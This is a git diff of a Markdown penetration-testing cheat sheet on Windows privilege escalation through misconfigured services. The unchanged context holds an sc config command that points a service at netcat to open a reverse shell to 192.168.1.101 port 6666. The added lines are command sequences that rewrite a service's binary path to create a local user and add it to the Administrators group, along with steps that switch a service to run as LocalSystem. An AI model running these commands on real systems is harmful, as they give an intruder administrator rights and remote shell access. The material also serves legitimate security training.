@@ -582,14 +582,30 @@ sc config upnphost binpath= "C:\Inetpub\nc.exe
 192.168.1.101 6666 -e c:\Windows\system32\cmd.exe"
 ```
 
+OR a msfvenom revshell (```.vbs``` or ```.exe```)
 
-OR ```“net user /add”``` OR a msfvenom revshell (```.vbs``` or ```.exe```):
 
+#### user add
+
+```obj= "DOMAIN\User" password= "Password01"``` :
 ```
 sc config upnphost obj= ".\LocalSystem" password= ""
 sc config upnphost depend= ""
 Sc upnphost stop; sc upnphost start
 ```
+
+OR ```“net user /add”``` 
+
+netuser binpath:-
+```
+sc config PFNET binpath= "net user rottenadmin P@ssword123! /add"
+sc stop PFNET
+sc start PFNET
+sc config PFNET binpath= "net localgroup Administrators rottenadmin /add"
+sc stop PFNET
+sc start PFNET
+```
+
 
 #### Unquoted Service Paths - race condition
 
